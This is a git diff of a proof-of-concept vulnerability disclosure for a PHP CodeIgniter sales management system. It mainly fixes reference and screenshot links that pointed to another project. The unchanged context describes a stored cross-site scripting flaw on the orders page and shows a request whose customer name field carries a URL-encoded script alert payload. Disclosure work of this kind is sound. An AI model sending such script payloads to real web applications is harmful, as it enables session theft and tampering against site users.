@@ -4,7 +4,7 @@
 #### Vendor: https://www.sourcecodester.com/users/tips23
 #### Software: https://www.sourcecodester.com/php-codeigniter-simple-sales-management-system-source-code
 #### Version: 1.0
-#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/POC.md
+#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Simple%20Sales%20Management%20System/Cross%20Site%20Scripting(Stored)/POC.md
 
 #### Description：
 #### Simple Sales Management System is vulnerable to Stored cross-site scripting on the orders edit page. The "New Order" parameter in 'http://localhost/ci_ssms/index.php/orders' is vulnerable.
@@ -44,6 +44,6 @@ Connection: close
 customer_name=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&products%5B%5D=21&qty%5B%5D=1
 ```
 
-![image](https://github.com/CyberThoth/CVE/blob/3071fcfdc929fce59f1f443928bfd0f6243d3c47/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/1.png)
+![image](https://github.com/CyberThoth/CVE/blob/d1a2fc603004a1be1a9069c8be1f99f8e72d882e/CVE/Simple%20Sales%20Management%20System/Cross%20Site%20Scripting(Stored)/1.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/3071fcfdc929fce59f1f443928bfd0f6243d3c47/CVE/Hotel%20Management%20system/Cross%20Site%20Scripting(Stored)/2.png)
+![image](https://github.com/CyberThoth/CVE/blob/d1a2fc603004a1be1a9069c8be1f99f8e72d882e/CVE/Simple%20Sales%20Management%20System/Cross%20Site%20Scripting(Stored)/2.png)
